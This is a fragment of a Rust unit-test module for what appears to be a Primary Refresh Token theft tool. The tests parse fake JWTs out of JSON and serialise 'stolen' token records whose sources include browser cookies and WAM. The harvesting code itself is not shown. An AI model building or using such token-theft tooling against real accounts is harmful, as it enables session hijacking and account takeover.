                {"refresh_token": fake_jwt.clone()}
            ]
        });

        let found = theft.find_prt_in_json(&json);
        assert!(found.is_some());
        assert_eq!(found.unwrap(), fake_jwt);
    }

    #[test]
    fn test_find_jwt_end() {
        assert_eq!(PrtTheft::find_jwt_end("eyJ.a.b rest"), Some(5));
        assert_eq!(PrtTheft::find_jwt_end("eyJ.a.b"), Some(5));
        assert_eq!(PrtTheft::find_jwt_end("short"), None);
    }

    #[test]
    fn test_prt_source_serialization() {
        let source = PrtSource::BrowserCookie;
        let json = serde_json::to_string(&source).unwrap();
        let deserialized: PrtSource = serde_json::from_str(&json).unwrap();
        assert_eq!(source, deserialized);
    }

    #[test]
    fn test_primary_refresh_token_serialization() {
        let prt = PrimaryRefreshToken {
            prt_value: "eyJ.a.b".to_string(),
            session_key: Some("key123".to_string()),
            upn: Some("user@contoso.com".to_string()),
            tenant_id: Some("tenant-123".to_string()),
            object_id: Some("obj-456".to_string()),
            stolen_at: 1704067200,
            source: PrtSource::Wam,
        };
        let json = serde_json::to_string(&prt).unwrap();
        let deserialized: PrimaryRefreshToken = serde_json::from_str(&json).unwrap();
        assert_eq!(prt.prt_value, deserialized.prt_value);
        assert_eq!(prt.source, deserialized.source);
    }
}
